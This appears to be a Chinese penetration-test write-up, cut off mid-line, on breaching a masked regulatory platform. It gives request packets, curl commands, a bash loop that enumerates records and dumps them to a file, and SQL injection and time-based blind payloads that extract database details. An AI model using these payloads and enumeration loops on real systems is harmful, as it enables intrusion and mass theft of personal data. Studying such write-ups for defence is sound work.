---
title: 从Token伪造到SQL注入，四步打穿某监管平台全库
url: https://mp.weixin.qq.com/s/9sZc24roErlvhpxQPsBVAQ
source: Doonsec's feed
date: 2026-10-24
fetch_date: 2026-10-25T07:06:29.246144
---

# 从Token伪造到SQL注入，四步打穿某监管平台全库

# 从Token伪造到SQL注入，四步打穿某监管平台全库

原创

炫彩之星
炫彩之星

菜鸟学安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

一个看似普通的移动端接口，请求头里随便填一个非空字符串，就能返回当事人的姓名、身份证号、手机号和入账账号。这不是剧本，而是这次攻防项目里真实发生的第一幕。

　　目标是一个面向移动端的业务后端。它没有复杂的登录流程，也没有额外的风控校验，鉴权逻辑简单到只剩一句「xxToken 是否非空」。正是这个设计，让后面的越权查询、批量遍历和 SQL 注入变得顺理成章。

　　在一次攻防项目中，我们发现“某平台”（xx.xx.xx.xx）存在移动端鉴权形同虚设、未认证批量 PII 泄露（IDOR）、searchKey 参数 SQL 注入等 3 项高危漏洞，以及接口文档未授权、全租户基础数据未授权 2 项中危漏洞，共 5 项。

　　五个漏洞按利用顺序排列：从最外层的鉴权一路打到数据库。

## 1 移动端鉴权Token伪造

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1（未授权，任意非空 xxToken）

**怎么发现的：**

       目标是从主站前端 JS 泄露的关联主机找到的，再用公开的证书透明日志确认了这个移动端；接口前缀 `/api/populace-mobile/` 和 xx 个接口清单，则来自未授权开放的 `v2/api-docs`。先做了一次鉴权基线：不带 `xxToken` 返回 500「token不能为空」，随便填一个非空值就 200——说明它只判断「有没有」，不判断「对不对」。

　　这个接口按 `decisionNumber`（决定书编号）查询涉xxxx物的xx账单。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gom924hJeCeRdcuPVsNtjJ8tCTzBUAowWRE1ernl49FI6icspNvqb4QXiaEm0TlyAeLHoIBPPDIsiaWxBTMxaOJb9GTvmd0FgcPhU/640?wx_fmt=png&from=appmsg)

　　正常来说，这个接口应该校验登录态。但实际只要请求头里带上 xxToken，值随便填一个非空字符串，服务端就放行：

```
【请求包】
GET /api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1 HTTP/1.1
Host: xx.xx.xx.xx
xxToken: x
```

![](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqWCyq3QrHQFq8PiaJ6bNXVuht5pA8Bo7QhNWF0EPYAZPbfKWiacE5YYAcPmjpJo1EKEQNLuXCWy4LNsp2hYVSLQicoYwibA9dico3s/640?wx_fmt=png&from=appmsg)

　　返回的是当事人的完整业务信息：

```
【响应包】
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json

{
 "code": 200,
 "msg": "操作成功",
 "data": {
  "amount": "xx",
  "caseNumber": "xx",
  "suspect": "xx",
  "suspectIdCard": "xx",
  "suspectPhoneNumber": "xx",
  "virtualBankAccount": "xx",
  "…": "其余 8 个字段略"
 }
}
```

　　关键字段就这几个：当事人姓名、身份证、手机号、收款虚拟账号，加上金额和xx号。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gqawicEMMKFeSHxtJvQsCAkN7bWsvz8VWoVBznibNhzZuF2Q5DRM9PbC09UbLlT4xSNDuvT5h13vOWnaTMUHFic3wBZMxmewsGia6U/640?wx_fmt=png&from=appmsg)

　　对照测试很清楚：去掉 xxToken 头，返回 `{"code":500,"msg":"token不能为空"}`；把值换成 `1`、`x`、`AAAA...`、甚至 `"' or '1'='1"`，全部返回 code:200。

　　前端 JS 审计也印证了这一点：xxToken 直接取自本地存储，请求时没有附加签名或时间戳，服务端也没有做二次校验。也就是说，这套鉴权只判断了「有没有」，没判断「对不对」。

　　更麻烦的是 decisionNumber 是顺序编号。写个循环从 1 递增，实测命中 xx 条真实记录：

```
# 单请求
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1" -H "xxToken: x"

# 批量遍历（实测命中 xx 条真实记录）
for i in $(seq 1 40); do
 curl -sk "https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=$i" -H "xxToken: x"; echo;
done > waitpay_dump.json
```

![](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqLPGQpekwiclKibWYNPKxkiaRUtLLbPicHaK6KuM39yxSic6yUKibLU3q42VC1wdTOuibheetrevagX2cQFM7J1ldhJe1f08u9pGOmj4/640?wx_fmt=png&from=appmsg)

> 不需要任何凭据，一个 for 循环就能把整个辖区的xx账单跑一遍。

---

## 2 未认证批量 PII 泄露

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx（未授权 + IDOR）

**怎么发现的：**

       同一个前缀、同一份 `v2/api-docs` 清单里还有 `executed-bills/query`。它和上一个接口共用同一套鉴权基线（任意非空 `xxToken` 即过），区别是查询主键换成了身份证号，且没有做数据权限校验——典型的 IDOR。

　　同一个系统，另一个接口暴露得更彻底：

```
GET /api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx
```

　　接口拿身份证号做检索条件，直接返回当事人的账单记录，没有鉴权、也没有数据权限校验——典型的 IDOR。

　　缺 xxToken 时返回 token 不能为空：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goicwh4kX6Jk61bFys6hscVlPwiadau2JYkwSHZcloZrLde1FNeSajPWIx6zfqDPvYWDnWaJ4drrvoYmYiaABPAWMsNl7kumh08Ps/640?wx_fmt=png&from=appmsg)

　　加上任意 xxToken 后就正常出数据：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goDRb7AJtibYnV9WbxFYF6ypCBicREgLeQ1d507kAsA8bWOnWsctG0cTKNNmhj409g0cOwdpUDbyDLsGW7ArEFhEyuzDv4LjorPo/640?wx_fmt=png&from=appmsg)

```
【请求包】
GET /api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```
【响应包】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "code": 200,
 "msg": "操作成功",
 "data": {
  "pages": {
   "records": [
    {
     "amount": "xx",
     "payAmount": "xx",
     "caseNumber": "xx",
     "decisionNumber": "xx",
     "suspect": "xx",
     "suspectIdCard": "xx",
     "suspectPhoneNumber": "xx",
     "virtualBankAccount": "xx",
     "recipientAccount": "xx",
     "…": "其余 20 个字段略"
    }
   ],
   "total": 3
  }
 }
}
```

```
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx" -H "xxToken: aaa"
```

> 危害比上一个更直接：参数就是身份证号，而身份证号在各类业务场景里是最容易拿到的标识。拿着它就能对任意xx拉取账单记录。

---

## 3 searchKey 参数 SQL 注入

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=%' OR 1=1-- -（未授权 + SQL 注入）

**怎么发现的：**

       注入点不是扫出来的，是在 `v2/api-docs` 里看到 `executed-bills/query` 还有个 `searchKey` 参数，结合返回字段推断它进了模糊查询。先发一个单引号，报错页把拼接后的 SQL 原样吐了回来，确认 `searchKey` 走的是 MyBatis `LIKE '%${searchKey}%'`、没有参数化；再用 `sleep(3)` 做真假对照，确认可以时间盲注。

　　还是同一个接口，多塞一个 `searchKey` 参数：

　　单引号闭合后，报错页把拼接后的 SQL 原样吐了回来：

```
【请求包】
GET /api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=%25%27%20OR%201%3D1--%20- HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```
【响应包（截取注入点相关部分）】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "code": 500,
 "msg": "nested exception is org.apache.ibatis.exceptions.PersistenceException:
 ### Error querying database. ...
 SELECT COUNT(1) FROM ( SELECT t.* FROM (
      ...
        AND (b.decision_number like '%%' OR 1=1-- -%' or b.bank_account like '%%' OR 1=1-- -%')  ← ${searchKey} 直接拼接
      ...
 ) TOTAL
 ### The error may exist in URL [jar:file:/xx/xx.jar!/BOOT-INF/classes!/mapper/BillRecordMapper.xml]"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gqMib2SbGia8qD7ib8nojY9rbJ3Rh0rnuzOribSjicb1xyRXojDicChWEmo86OwrcbMp3OZle3uhjJSogjErUOlNqk7dQYn8UXJsibCHg/640?wx_fmt=png&from=appmsg)

　　报错页不只是回显 SQL，连后端 jar 的绝对路径和 mapper 文件名一起给了。

　　时间盲注验证（`<>` 表示不等于）：

```
2023' and sleep(3) and '1'<>'2                     → 3.40s （条件为真，延时生效）
2023' and sleep(3) and '1'='2                      → 0.34s （常量假，短路）
2023' and sleep(0) and '1'<>'2                     → 0.37s （对照）
2023' and (select if(1=1,sleep(3),0)) and '1'<>'2  → 3.35s （子查询可控）
zzzzz' or (select sleep(3)) or '1'='1              → 15.21s （504 网关超时，sleep 叠加生效）
```

**实测过程**

　　searchKey=2023' and sleep(3) and '1'='2 （1不等于2，条件为假，不执行3秒，返回0.34秒）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grLCY3CNYpUqnI4ticIpZTYpCGovjZG9aqy8gSSMAqNTkYetwiaVmCMwnkHaiaNP2WbFzOLlPngxmIh7kYuneXCJddK1RODly6RlM/640?wx_fmt=png&from=appmsg)

https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023' and sleep(3) and '1'='2

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gqAOqIEFflpoGKw578ibPibVBB39BkLbanJvAzjRibEvxZAUPLCziaKYSQYN9DtdUCJsJoF0z1EGIEnrNGGMu3aQkxE15Fuym1BPlc/640?wx_fmt=png&from=appmsg)

　　注入点：

　　searchKey=2023' and sleep(3) and '1'<>'2 （`<>` 表示不等于，1 不等于 2，条件为真，执行 3 秒）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goHribfoVnLFmdMKiclYHu7gNG2oxuFHKZBibXEMP4QibAOk0Geic6SrBjjmAdibUUAoNThUVzTHeEoDEqPicbACtl1eGngpedQr5R1pk/640?wx_fmt=png&from=appmsg)

https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023' and sleep(3) and '1'<>'2

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goEjlQGXdwxFGeibYKibXADcawLrX4MLaSXvZHtMiaos2JyuNwIq6UDC3LhG8ibmia67EXRxJACo5cmcoDibXWIuGsF836mquQrNickPc/640?wx_fmt=png&from=appmsg)

```
【请求包（sleep=3 载荷）】
GET /api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023%27+and+sleep%283%29+and+%271%27%3C%3E%272 HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023%27+and+sleep%283%29+and+%271%27%3C%3E%272" -H "xxToken: aaa"
```

```
【响应包】HTTP/1.1 200 OK（响应耗时 3.40s）
```

　　布尔 + 时间双通道逐字符提取，实测拿到数据库信息：

```
version()            5.7.25
current_user()       root@%
database()           xx-server
@@secure_file_priv   /var/lib/mysql-files/
@@datadir            /var/lib/mysql/
```

　　当前连接账号是 root@%，具备 SUPER + FILE 权限；堆叠查询未开启，secure\_file\_priv 受限。这个 MySQL 实例是多库共享，共 多个库。

　　二分盲注脚本（注出 database 和 version）：

```
python xx_sqli_blin...